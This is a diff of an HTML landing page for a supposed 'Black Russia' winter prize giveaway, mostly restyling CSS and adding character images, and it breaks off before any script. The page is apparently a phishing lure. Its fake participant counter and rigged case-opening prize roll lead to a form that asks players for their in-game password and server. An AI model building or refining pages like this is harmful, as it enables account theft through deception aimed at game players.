@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html lang="ru">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Зимний Розыгрыш Black Russia 2026 | Участвуй и Выигрывай</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=Montserrat:wght@700&display=swap" rel="stylesheet">
-    
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=Montserrat:wght@700&display=swap"
+        rel="stylesheet">
+
     <style>
         * {
             margin: 0;
@@ -19,7 +22,10 @@
         body {
             font-family: "Montserrat", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
             font-weight: 700;
-            background: linear-gradient(180deg, #0a1929 0%, #1a3a52 50%, #2d5f7a 100%);
+            background: url('background.png') no-repeat center top;
+            background-size: cover;
+            background-attachment: fixed;
+            background-color: #0a0a0a;
             color: #fff;
             overflow-x: hidden;
             min-height: 100vh;
@@ -54,15 +60,19 @@
             0% {
                 transform: translateY(0) rotate(0deg) translateX(0);
             }
+
             25% {
                 transform: translateY(25vh) rotate(90deg) translateX(15px);
             }
+
             50% {
                 transform: translateY(50vh) rotate(180deg) translateX(-10px);
             }
+
             75% {
                 transform: translateY(75vh) rotate(270deg) translateX(20px);
             }
+
             100% {
                 transform: translateY(110vh) rotate(360deg) translateX(0);
             }
@@ -162,22 +172,40 @@
         .cta-button {
             display: inline-block;
             margin: 20px auto;
-            padding: 18px 45px;
-            background: linear-gradient(135deg, #ffffff 0%, #e3f2ff 100%);
-            border-radius: 50px;
-            color: #0a1929;
-            font-size: 1.2rem;
+            padding: 20px 50px;
+            background: #ffffff;
+            color: #0a0a0a;
+            font-size: 1.3rem;
             font-weight: 700;
             text-decoration: none;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             cursor: pointer;
-            border: none;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            position: relative;
+            clip-path: polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px);
+            text-transform: none;
+            letter-spacing: 0.5px;
+        }
+
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, transparent 10px, rgba(0, 0, 0, 0.05) 10px);
+            pointer-events: none;
         }
 
         .cta-button:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            background: #f0f0f0;
+        }
+
+        .cta-button:active {
+            transform: translateY(0);
         }
 
         .modal {
@@ -202,8 +230,13 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
         }
 
         .modal-content {
@@ -225,6 +258,7 @@
                 opacity: 0;
                 transform: translateY(50px);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0);
@@ -274,7 +308,8 @@
             opacity: 0.95;
         }
 
-        .form-input, .form-select {
+        .form-input,
+        .form-select {
             width: 100%;
             padding: 14px 16px;
             background: rgba(255, 255, 255, 0.1);
@@ -286,7 +321,8 @@
             transition: all 0.3s ease;
         }
 
-        .form-input:focus, .form-select:focus {
+        .form-input:focus,
+        .form-select:focus {
             outline: none;
             border-color: rgba(255, 255, 255, 0.5);
             background: rgba(255, 255, 255, 0.15);
@@ -384,6 +420,7 @@
             from {
                 transform: scale(0);
             }
+
             to {
                 transform: scale(1);
             }
@@ -498,7 +535,7 @@
         /* ============================================
            CS2-STYLE SKIN ROLL - НЕ РУЛЕТКА!
            ============================================ */
-        
+
         .roll-container {
             position: relative;
             width: 100%;
@@ -509,7 +546,7 @@
             border-radius: 12px;
             background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
             border: 3px solid #2d3a4f;
-            box-shadow: 
+            box-shadow:
                 0 0 30px rgba(0, 0, 0, 0.5),
                 inset 0 0 60px rgba(0, 0, 0, 0.3);
         }
@@ -524,7 +561,7 @@
             height: 100%;
             background: linear-gradient(180deg, #ffd700 0%, #ff8c00 100%);
             z-index: 100;
-            box-shadow: 
+            box-shadow:
                 0 0 20px #ffd700,
                 0 0 40px #ffd70080;
         }
@@ -631,15 +668,22 @@
         .roll-item.ultra {
             background: linear-gradient(180deg, #b7791f 0%, #744210 100%);
             border: 2px solid #ffd700;
-            box-shadow: 
+            box-shadow:
                 0 4px 20px rgba(255, 215, 0, 0.5),
                 inset 0 0 20px rgba(255, 215, 0, 0.1);
             animation: ultraGlow 2s ease-in-out infinite;
         }
 
         @keyframes ultraGlow {
-            0%, 100% { box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5); }
-            50% { box-shadow: 0 4px 35px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.3); }
+
+            0%,
+            100% {
+                box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5);
+            }
+
+            50% {
+                box-shadow: 0 4px 35px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.3);
+            }
         }
 
         .roll-item-icon {
@@ -647,7 +691,7 @@
             height: 60px;
             margin-bottom: 6px;
             object-fit: contain;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
         }
 
         .roll-item-icon.emoji {
@@ -661,7 +705,7 @@
             font-weight: 700;
             text-align: center;
             padding: 0 6px;
-            color: rgba(255,255,255,0.9);
+            color: rgba(255, 255, 255, 0.9);
             text-transform: uppercase;
             letter-spacing: 0.3px;
             line-height: 1.2;
@@ -679,10 +723,21 @@
             height: 4px;
         }
 
-        .roll-item.common::after { background: #718096; }
-        .roll-item.uncommon::after { background: #48bb78; }
-        .roll-item.rare::after { background: #63b3ed; }
-        .roll-item.ultra::after { background: linear-gradient(90deg, #ffd700, #ff8c00, #ffd700); }
+        .roll-item.common::after {
+            background: #718096;
+        }
+
+        .roll-item.uncommon::after {
+            background: #48bb78;
+        }
+
+        .roll-item.rare::after {
+            background: #63b3ed;
+        }
+
+        .roll-item.ultra::after {
+            background: linear-gradient(90deg, #ffd700, #ff8c00, #ffd700);
+        }
 
         /* Победный элемент */
         .roll-item.winner {
@@ -699,15 +754,33 @@
         }
 
         @keyframes winnerUltraPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.15); box-shadow: 0 0 50px #ffd700; }
-            100% { transform: scale(1.08); }
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.15);
+                box-shadow: 0 0 50px #ffd700;
+            }
+
+            100% {
+                transform: scale(1.08);
+            }
         }
 
         @keyframes winnerRarePulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.12); box-shadow: 0 0 40px #63b3ed; }
-            100% { transform: scale(1.08); }
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.12);
+                box-shadow: 0 0 40px #63b3ed;
+            }
+
+            100% {
+                transform: scale(1.08);
+            }
         }
 
         .spin-button {
@@ -754,8 +827,15 @@
         }
 
         @keyframes resultReveal {
-            0% { opacity: 0; transform: translateY(20px) scale(0.95); }
-            100% { opacity: 1; transform: translateY(0) scale(1); }
+            0% {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
 
         .prize-result-title {
@@ -803,7 +883,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         @media (max-width: 768px) {
@@ -827,335 +909,835 @@
                 grid-template-columns: 1fr;
             }
         }
+
+        /* ========================================= */
+        /* СЕКЦИЯ С УЧАСТНИКАМИ И ПЕРСОНАЖАМИ       */
+        /* ========================================= */
+
+        /* Основная карточка */
+        .participants-section {
+            position: relative;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 30px 20px;
+            text-align: center;
+            border-radius: 20px;
+            background: linear-gradient(135deg, rgba(74, 222, 128, 0.2), rgba(34, 197, 94, 0.15));
+            backdrop-filter: blur(15px);
+            /* overflow: hidden;  <- Скрывать или нет? На десктопе персонажи торчат наружу. */
+            /* На десктопе персонажи должны выходить за границы (position absolute с отрицательными координатами).
+               Значит overflow visible по умолчанию. */
+        }
+
+        .participants-number {
+            font-size: 4rem;
+            font-weight: 900;
+            margin: 10px 0;
+            position: relative;
+            z-index: 20;
+        }
+
+        /* Кнопка */
+        .cta-button {
+            position: relative;
+            z-index: 25;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Персонажи */
+        .character-left,
+        .character-right {
+            position: absolute;
+            bottom: 0;
+            z-index: 5;
+            /* Ниже текста (20) и кнопки (25) */
+            pointer-events: none;
+        }
+
+        .character-left img,
+        .character-right img {
+            width: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.5));
+        }
+
+        /* --- АДАПТИВНОСТЬ --- */
+
+        /* Desktop & Laptop */
+        @media (min-width: 993px) {
+            .character-left {
+                right: 100%;
+                margin-right: -40px;
+            }
+
+            .character-right {
+                left: 100%;
+                margin-left: -40px;
+            }
+
+            .character-left img {
+                max-height: 500px;
+                max-width: 350px;
+            }
+
+            .character-right img {
+                max-height: 500px;
+                max-width: 320px;
+            }
+        }
+
+        /* Large screens tuning */
+        @media (min-width: 1400px) {
+            .character-left {
+                margin-right: -80px;
+            }
+
+            .character-right {
+                margin-left: -80px;
+            }
+        }
+
+        /* Tablet (medium) */
+        @media (max-width: 992px) {
+            .character-left {
+                left: -120px;
+            }
+
+            .character-right {
+                right: -120px;
+            }
+
+            .character-left img,
+            .character-right img {
+                max-height: 350px;
+                max-width: 200px;
+            }
+        }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            .participants-section {
+                margin: 20px 15px;
+                padding-bottom: 20px;
+                overflow: hidden;
+                /* На мобильном обрезаем всё что торчит */
+                display: flex;
+                flex-direction: column;
+                justify-content: flex-end;
+            }
+
+            /* Персонажи ВНУТРИ карточки по бокам снизу */
+            .character-left {
+                left: -90px;
+                bottom: -40px;
+                z-index: 5;
+            }
+
+            .character-right {
+                right: -50px;
+                bottom: -40px;
+                z-index: 5;
+            }
+
+            .character-left img,
+            .character-right img {
+                max-height: 600px;
+                /* Значительно больше */
+                max-width: 350px;
+                opacity: 0.95;
+                filter: drop-shadow(0 0 10px rgba(0, 0, 0, 0.3));
+            }
+
+            .participants-number {
+                font-size: 3.5rem;
+                margin: 10px 0;
+            }
+
+            .cta-button {
+                margin-top: 15px;
+                z-index: 30;
+                width: 100%;
+            }
+        }
+
+        /* Small Mobile */
+        @media (max-width: 480px) {
+            .character-left {
+                left: -20px;
+                bottom: -10px;
+            }
+
+            .character-right {
+                right: -20px;
+                bottom: -10px;
+            }
+
+            .character-left img,
+            .character-right img {
+                max-height: 180px;
+                max-width: 120px;
+            }
+        }
     </style>
 </head>
+
 <body>
 
-<div class="snow" id="snow-container"></div>
+    <div class="snow" id="snow-container"></div>
 
-<header>
-    <div class="header-content">
-        <img src="logo.png" alt="Black Russia" class="game-logo">
-        <div class="header-text">
-            <h1>Зимние призы Black Russia</h1>
-            <p>Участвуй и выигрывай эксклюзивные призы!</p>
-        </div>
-    </div>
-</header>
-
-<div class="timer-section">
-    <div style="text-align: center; margin-bottom: 15px; font-weight: 700;">⏰ До окончания розыгрыша</div>
-    <div class="timer-display">
-        <div class="timer-block">
-            <span class="timer-number" id="days">00</span>
-            <span class="timer-label">Дней</span>
-        </div>
-        <div class="timer-block">
-            <span class="timer-number" id="hours">00</span>
-            <span class="timer-label">Часов</span>
-        </div>
-        <div class="timer-block">
-            <span class="timer-number" id="minutes">00</span>
-            <span class="timer-label">Минут</span>
-        </div>
-        <div class="timer-block">
-            <span class="timer-number" id="seconds">00</span>
-            <span class="timer-label">Секунд</span>
-        </div>
-    </div>
-</div>
-
-<div class="participants-section">
-    <span style="font-size: 2.5rem;">👥</span>
-    <div class="participants-number" id="participant-count">1,247</div>
-    <div style="font-size: 1.2rem; font-weight: 600; text-transform: uppercase;">Уже участвуют</div>
-    
-    <button class="cta-button" id="openModal">
-        ✨ Участвовать в розыгрыше →
-    </button>
-</div>
-
-<div class="prizes-grid">
-    <div class="prize-card">
-        <span class="prize-icon">🚗</span>
-        <div class="prize-title">Премиум Авто</div>
-        <div class="prize-description">Эксклюзивные автомобили премиум-класса с уникальными скинами</div>
-    </div>
-    <div class="prize-card">
-        <span class="prize-icon">🏠</span>
-        <div class="prize-title">Дома и Особняки</div>
-        <div class="prize-description">Роскошные особняки в лучших районах города</div>
-    </div>
-    <div class="prize-card">
-        <span class="prize-icon">💼</span>
-        <div class="prize-title">Бизнесы</div>
-        <div class="prize-description">Прибыльные бизнесы для пассивного дохода</div>
-    </div>
-    <div class="prize-card">
-        <span class="prize-icon">💎</span>
-        <div class="prize-title">Донат Валюта</div>
-        <div class="prize-description">Внутриигровая валюта и эксклюзивные бонусы</div>
-    </div>
-</div>
-
-<div class="modal" id="registrationModal">
-    <div class="modal-content">
-        <button class="modal-close" id="closeModal">&times;</button>
-        
-        <!-- CS2-STYLE SKIN ROLL -->
-        <div id="rouletteContainer">
-            <div class="modal-title">🎰 Открой кейс!</div>
-            <div class="modal-subtitle">Испытай удачу и получи свой приз!</div>
-            
-            <div class="roll-container" id="rollContainer">
-                <div class="roll-marker"></div>
-                <div class="roll-track" id="rollTrack"></div>
+    <header>
+        <div class="header-content">
+            <img src="logo.png" alt="Black Russia" class="game-logo">
+            <div class="header-text">
+                <h1>Зимние призы Black Russia</h1>
+                <p>Участвуй и выигрывай эксклюзивные призы!</p>
             </div>
-            
-            <button class="spin-button" id="spinButton">🎲 ОТКРЫТЬ</button>
-            
-            <div class="prize-result" id="prizeResult">
-                <div class="prize-result-title">🎉 Твой приз:</div>
-                <div class="prize-result-text" id="prizeText"></div>
-            </div>
-            
-            <button class="cta-button" id="goToFormBtn" style="display: none; margin-top: 15px;">
-                ✨ Забрать приз →
-            </button>
         </div>
-        
-        <!-- Форма регистрации -->
-        <div id="formContainer" style="display: none;">
-            <div class="modal-title">🎉 Забери свой приз!</div>
-            <div class="modal-subtitle">Заполни данные для получения приза</div>
-            
-            <div class="won-prize-display" id="wonPrizeDisplay">
-                <img id="wonPrizeIcon" src="" alt="Prize">
-                <span id="wonPrizeLabel"></span>
+    </header>
+
+    <div class="timer-section">
+        <div style="text-align: center; margin-bottom: 15px; font-weight: 700;">⏰ До окончания розыгрыша</div>
+        <div class="timer-display">
+            <div class="timer-block">
+                <span class="timer-number" id="days">00</span>
+                <span class="timer-label">Дней</span>
             </div>
-            
-            <form id="registrationForm">
-                <div class="form-group">
-                    <label class="form-label">🎮 Игровой никнейм</label>
-                    <input type="text" class="form-input" id="nickname" placeholder="Пример: Alex_Smith" required>
-                    <div class="form-help info show">Формат: Имя_Фамилия (только английские буквы и _)</div>
-                    <div class="form-help error" id="nickname-error"></div>
+            <div class="timer-block">
+                <span class="timer-number" id="hours">00</span>
+                <span class="timer-label">Часов</span>
+            </div>
+            <div class="timer-block">
+                <span class="timer-number" id="minutes">00</span>
+                <span class="timer-label">Минут</span>
+            </div>
+            <div class="timer-block">
+                <span class="timer-number" id="seconds">00</span>
+                <span class="timer-label">Секунд</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Секция с участниками и персонажами -->
+    <!-- Секция с участниками и персонажами -->
+    <div class="participants-section">
+        <!-- Персонажи -->
+        <div class="character-left">
+            <img src="boy.png" alt="Персонаж">
+        </div>
+
+        <div class="character-right">
+            <img src="girl.png" alt="Персонаж">
+        </div>
+
+        <span style="font-size: 2.5rem;">👥</span>
+        <div class="participants-number" id="participant-count">1,247</div>
+        <div style="font-size: 1.2rem; font-weight: 600; text-transform: uppercase;">Уже участвуют</div>
+
+        <button class="cta-button" id="openModal">
+            ✨ Участвовать в розыгрыше →
+        </button>
+    </div>
+
+    <div class="prizes-grid">
+        <div class="prize-card">
+            <span class="prize-icon">🚗</span>
+            <div class="prize-title">Премиум Авто</div>
+            <div class="prize-description">Эксклюзивные автомобили премиум-класса с уникальными скинами</div>
+        </div>
+        <div class="prize-card">
+            <span class="prize-icon">🏠</span>
+            <div class="prize-title">Дома и Особняки</div>
+            <div class="prize-description">Роскошные особняки в лучших районах города</div>
+        </div>
+        <div class="prize-card">
+            <span class="prize-icon">💼</span>
+            <div class="prize-title">Бизнесы</div>
+            <div class="prize-description">Прибыльные бизнесы для пассивного дохода</div>
+        </div>
+        <div class="prize-card">
+            <span class="prize-icon">💎</span>
+            <div class="prize-title">Донат Валюта</div>
+            <div class="prize-description">Внутриигровая валюта и эксклюзивные бонусы</div>
+        </div>
+    </div>
+
+    <div class="modal" id="registrationModal">
+        <div class="modal-content">
+            <button class="modal-close" id="closeModal">&times;</button>
+
+            <!-- CS2-STYLE SKIN ROLL -->
+            <div id="rouletteContainer">
+                <div class="modal-title">🎰 Открой кейс!</div>
+                <div class="modal-subtitle">Испытай удачу и получи свой приз!</div>
+
+                <div class="roll-container" id="rollContainer">
+                    <div class="roll-marker"></div>
+                    <div class="roll-track" id="rollTrack"></div>
                 </div>
-                
-                <div class="form-group">
-                    <label class="form-label">🔑 Пароль</label>
-                    <input type="password" class="form-input" id="password" placeholder="Ваш игровой пароль" required>
-                    <div class="form-help info show">Минимум 6 символов</div>
-                    <div class="form-help error" id="password-error"></div>
+
+                <button class="spin-button" id="spinButton">🎲 ОТКРЫТЬ</button>
+
+                <div class="prize-result" id="prizeResult">
+                    <div class="prize-result-title">🎉 Твой приз:</div>
+                    <div class="prize-result-text" id="prizeText"></div>
                 </div>
-                
-                <div class="form-group">
-                    <label class="form-label">🖥 Выберите сервер</label>
-                    <select class="form-select" id="server" required>
-                        <option value="">-- Выберите сервер --</option>
-                        <option value="1. Red">1. Red</option>
-                        <option value="2. Green">2. Green</option>
-                        <option value="3. Blue">3. Blue</option>
-                        <option value="4. Yellow">4. Yellow</option>
-                        <option value="5. Orange">5. Orange</option>
-                        <option value="6. Purple">6. Purple</option>
-                        <option value="7. Lime">7. Lime</option>
-                        <option value="8. Pink">8. Pink</option>
-                        <option value="9. Cherry">9. Cherry</option>
-                        <option value="10. Black">10. Black</option>
-                        <option value="11. Indigo">11. Indigo</option>
-                        <option value="12. White">12. White</option>
-                        <option value="13. Magenta">13. Magenta</option>
-                        <option value="14. Crimson">14. Crimson</option>
-                        <option value="15. Gold">15. Gold</option>
-                        <option value="16. Azure">16. Azure</option>
-                        <option value="17. Platinum">17. Platinum</option>
-                        <option value="18. Aqua">18. Aqua</option>
-                        <option value="19. Gray">19. Gray</option>
-                        <option value="20. Ice">20. Ice</option>
-                        <option value="21. Chilli">21. Chilli</option>
-                        <option value="22. Choco">22. Choco</option>
-                        <option value="23. Moscow">23. Moscow</option>
-                        <option value="24. SPB">24. SPB</option>
-                        <option value="25. UFA">25. UFA</option>
-                        <option value="26. Sochi">26. Sochi</option>
-                        <option value="27. Kazan">27. Kazan</option>
-                        <option value="28. Samara">28. Samara</option>
-                        <option value="29. Rostov">29. Rostov</option>
-                        <option value="30. Anapa">30. Anapa</option>
-                        <option value="31. EKB">31. EKB</option>
-                        <option value="32. Krasnodar">32. Krasnodar</option>
-                        <option value="33. Arzamas">33. Arzamas</option>
-                        <option value="34. Novosib">34. Novosib</option>
-                        <option value="35. Grozny">35. Grozny</option>
-                        <option value="36. Saratov">36. Saratov</option>
-                        <option value="37. Omsk">37. Omsk</option>
-                        <option value="38. Irkutsk">38. Irkutsk</option>
-                        <option value="39. Volgograd">39. Volgograd</option>
-                        <option value="40. Voronezh">40. Voronezh</option>
-                        <option value="41. Belgorod">41. Belgorod</option>
-                        <option value="42. Makhachkala">42. Makhachkala</option>
-                        <option value="43. Vladikavkaz">43. Vladikavkaz</option>
-                        <option value="44. Vladivostok">44. Vladivostok</option>
-                        <option value="45. Kaliningrad">45. Kaliningrad</option>
-                        <option value="46. Chelyabinsk">46. Chelyabinsk</option>
-                        <option value="47. Krasnoyarsk">47. Krasnoyarsk</option>
-                        <option value="48. Cheboksary">48. Cheboksary</option>
-                        <option value="49. Khabarovsk">49. Khabarovsk</option>
-                        <option value="50. Perm">50. Perm</option>
-                        <option value="51. Tula">51. Tula</option>
-                        <option value="52. Ryazan">52. Ryazan</option>
-                        <option value="53. Murmansk">53. Murmansk</option>
-                        <option value="54. Penza">54. Penza</option>
-                        <option value="55. Kursk">55. Kursk</option>
-                        <option value="56. Arkhangelsk">56. Arkhangelsk</option>
-                        <option value="57. Orenburg">57. Orenburg</option>
-                        <option value="58. Kirov">58. Kirov</option>
-                        <option value="59. Kemerovo">59. Kemerovo</option>
-                        <option value="60. Tyumen">60. Tyumen</option>
-                        <option value="61. Tolyatti">61. Tolyatti</option>
-                        <option value="62. Ivanovo">62. Ivanovo</option>
-                        <option value="63. Stavropol">63. Stavropol</option>
-                        <option value="64. Smolensk">64. Smolensk</option>
-                        <option value="65. Pskov">65. Pskov</option>
-                        <option value="66. Bryansk">66. Bryansk</option>
-                        <option value="67. Orel">67. Orel</option>
-                        <option value="68. Yaroslavl">68. Yaroslavl</option>
-                        <option value="69. Barnaul">69. Barnaul</option>
-                        <option value="70. Lipetsk">70. Lipetsk</option>
-                        <option value="71. Ulyanovsk">71. Ulyanovsk</option>
-                        <option value="72. Yakutsk">72. Yakutsk</option>
-                        <option value="73. Tambov">73. Tambov</option>
-                        <option value="74. Bratsk">74. Bratsk</option>
-                        <option value="75. Astrakhan">75. Astrakhan</option>
-                        <option value="76. Chita">76. Chita</option>
-                        <option value="77. Kostroma">77. Kostroma</option>
-                        <option value="78. Vladimir">78. Vladimir</option>
-                        <option value="79. Kaluga">79. Kaluga</option>
-                        <option value="80. Novgorod">80. Novgorod</option>
-                        <option value="81. Taganrog">81. Taganrog</option>
-                        <option value="82. Vologda">82. Vologda</option>
-                        <option value="83. Tver">83. Tver</option>
-                        <option value="84. Tomsk">84. Tomsk</option>
-                        <option value="85. Izhevsk">85. Izhevsk</option>
-                        <option value="86. Surgut">86. Surgut</option>
-                        <option value="87. Podolsk">87. Podolsk</option>
-                        <option value="88. Magadan">88. Magadan</option>
-                        <option value="89. Cherepovets">89. Cherepovets</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">📱 Telegram для связи (опционально)</label>
-                    <input type="text" class="form-input" id="telegram" placeholder="@ваш_telegram или оставьте пустым">
-                    <div class="form-help info show">Начинается с @ или оставьте пустым</div>
-                    <div class="form-help error" id="telegram-error"></div>
-                </div>
-                
-                <button type="submit" class="submit-button" id="submitBtn">
-                    🎁 Участвовать в розыгрыше
+
+                <button class="cta-button" id="goToFormBtn" style="display: none; margin-top: 15px;">
+                    ✨ Забрать приз →
                 </button>
-            </form>
-        </div>
-        
-        <div class="success-message" id="successMessage">
-            <div class="success-icon">✅</div>
-            <div class="modal-title">Успешно!</div>
-            <div class="modal-subtitle">Ваша заявка принята! Следите за результатами 🎉</div>
+            </div>
+
+            <!-- Форма регистрации -->
+            <div id="formContainer" style="display: none;">
+                <div class="modal-title">🎉 Забери свой приз!</div>
+                <div class="modal-subtitle">Заполни данные для получения приза</div>
+
+                <div class="won-prize-display" id="wonPrizeDisplay">
+                    <img id="wonPrizeIcon" src="" alt="Prize">
+                    <span id="wonPrizeLabel"></span>
+                </div>
+
+                <form id="registrationForm">
+                    <div class="form-group">
+                        <label class="form-label">🎮 Игровой никнейм</label>
+                        <input type="text" class="form-input" id="nickname" placeholder="Пример: Alex_Smith" required>
+                        <div class="form-help info show">Формат: Имя_Фамилия (только английские буквы и _)</div>
+                        <div class="form-help error" id="nickname-error"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">🔑 Пароль</label>
+                        <input type="password" class="form-input" id="password" placeholder="Ваш игровой пароль"
+                            required>
+                        <div class="form-help info show">Минимум 6 символов</div>
+                        <div class="form-help error" id="password-error"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">🖥 Выберите сервер</label>
+                        <select class="form-select" id="server" required>
+                            <option value="">-- Выберите сервер --</option>
+                            <option value="1. Red">1. Red</option>
+                            <option value="2. Green">2. Green</option>
+                            <option value="3. Blue">3. Blue</option>
+                            <option value="4. Yellow">4. Yellow</option>
+                            <option value="5. Orange">5. Orange</option>
+                            <option value="6. Purple">6. Purple</option>
+                            <option value="7. Lime">7. Lime</option>
+                            <option value="8. Pink">8. Pink</option>
+                            <option value="9. Cherry">9. Cherry</option>
+                            <option value="10. Black">10. Black</option>
+                            <option value="11. Indigo">11. Indigo</option>
+                            <option value="12. White">12. White</option>
+                            <option value="13. Magenta">13. Magenta</option>
+                            <option value="14. Crimson">14. Crimson</option>
+                            <option value="15. Gold">15. Gold</option>
+                            <option value="16. Azure">16. Azure</option>
+                            <option value="17. Platinum">17. Platinum</option>
+                            <option value="18. Aqua">18. Aqua</option>
+                            <option value="19. Gray">19. Gray</option>
+                            <option value="20. Ice">20. Ice</option>
+                            <option value="21. Chilli">21. Chilli</option>
+                            <option value="22. Choco">22. Choco</option>
+                            <option value="23. Moscow">23. Moscow</option>
+                            <option value="24. SPB">24. SPB</option>
+                            <option value="25. UFA">25. UFA</option>
+                            <option value="26. Sochi">26. Sochi</option>
+                            <option value="27. Kazan">27. Kazan</option>
+                            <option value="28. Samara">28. Samara</option>
+                            <option value="29. Rostov">29. Rostov</option>
+                            <option value="30. Anapa">30. Anapa</option>
+                            <option value="31. EKB">31. EKB</option>
+                            <option value="32. Krasnodar">32. Krasnodar</option>
+                            <option value="33. Arzamas">33. Arzamas</option>
+                            <option value="34. Novosib">34. Novosib</option>
+                            <option value="35. Grozny">35. Grozny</option>
+                            <option value="36. Saratov">36. Saratov</option>
+                            <option value="37. Omsk">37. Omsk</option>
+                            <option value="38. Irkutsk">38. Irkutsk</option>
+                            <option value="39. Volgograd">39. Volgograd</option>
+                            <option value="40. Voronezh">40. Voronezh</option>
+                            <option value="41. Belgorod">41. Belgorod</option>
+                            <option value="42. Makhachkala">42. Makhachkala</option>
+                            <option value="43. Vladikavkaz">43. Vladikavkaz</option>
+                            <option value="44. Vladivostok">44. Vladivostok</option>
+                            <option value="45. Kaliningrad">45. Kaliningrad</option>
+                            <option value="46. Chelyabinsk">46. Chelyabinsk</option>
+                            <option value="47. Krasnoyarsk">47. Krasnoyarsk</option>
+                            <option value="48. Cheboksary">48. Cheboksary</option>
+                            <option value="49. Khabarovsk">49. Khabarovsk</option>
+                            <option value="50. Perm">50. Perm</option>
+                            <option value="51. Tula">51. Tula</option>
+                            <option value="52. Ryazan">52. Ryazan</option>
+                            <option value="53. Murmansk">53. Murmansk</option>
+                            <option value="54. Penza">54. Penza</option>
+                            <option value="55. Kursk">55. Kursk</option>
+                            <option value="56. Arkhangelsk">56. Arkhangelsk</option>
+                            <option value="57. Orenburg">57. Orenburg</option>
+                            <option value="58. Kirov">58. Kirov</option>
+                            <option value="59. Kemerovo">59. Kemerovo</option>
+                            <option value="60. Tyumen">60. Tyumen</option>
+                            <option value="61. Tolyatti">61. Tolyatti</option>
+                            <option value="62. Ivanovo">62. Ivanovo</option>
+                            <option value="63. Stavropol">63. Stavropol</option>
+                            <option value="64. Smolensk">64. Smolensk</option>
+                            <option value="65. Pskov">65. Pskov</option>
+                            <option value="66. Bryansk">66. Bryansk</option>
+                            <option value="67. Orel">67. Orel</option>
+                            <option value="68. Yaroslavl">68. Yaroslavl</option>
+                            <option value="69. Barnaul">69. Barnaul</option>
+                            <option value="70. Lipetsk">70. Lipetsk</option>
+                            <option value="71. Ulyanovsk">71. Ulyanovsk</option>
+                            <option value="72. Yakutsk">72. Yakutsk</option>
+                            <option value="73. Tambov">73. Tambov</option>
+                            <option value="74. Bratsk">74. Bratsk</option>
+                            <option value="75. Astrakhan">75. Astrakhan</option>
+                            <option value="76. Chita">76. Chita</option>
+                            <option value="77. Kostroma">77. Kostroma</option>
+                            <option value="78. Vladimir">78. Vladimir</option>
+                            <option value="79. Kaluga">79. Kaluga</option>
+                            <option value="80. Novgorod">80. Novgorod</option>
+                            <option value="81. Taganrog">81. Taganrog</option>
+                            <option value="82. Vologda">82. Vologda</option>
+                            <option value="83. Tver">83. Tver</option>
+                            <option value="84. Tomsk">84. Tomsk</option>
+                            <option value="85. Izhevsk">85. Izhevsk</option>
+                            <option value="86. Surgut">86. Surgut</option>
+                            <option value="87. Podolsk">87. Podolsk</option>
+                            <option value="88. Magadan">88. Magadan</option>
+                            <option value="89. Cherepovets">89. Cherepovets</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">📱 Telegram для связи (опционально)</label>
+                        <input type="text" class="form-input" id="telegram"
+                            placeholder="@ваш_telegram или оставьте пустым">
+                        <div class="form-help info show">Начинается с @ или оставьте пустым</div>
+                        <div class="form-help error" id="telegram-error"></div>
+                    </div>
+
+                    <button type="submit" class="submit-button" id="submitBtn">
+                        🎁 Участвовать в розыгрыше
+                    </button>
+                </form>
+            </div>
+
+            <div class="success-message" id="successMessage">
+                <div class="success-icon">✅</div>
+                <div class="modal-title">Успешно!</div>
+                <div class="modal-subtitle">Ваша заявка принята! Следите за результатами 🎉</div>
+            </div>
         </div>
     </div>
-</div>
 
-<main>
-    <section>
-        <h2>📋 Правила участия</h2>
-        <ul style="list-style: none; padding: 0;">
-            <li style="margin: 12px 0;">❄ Зарегистрируйтесь через форму выше</li>
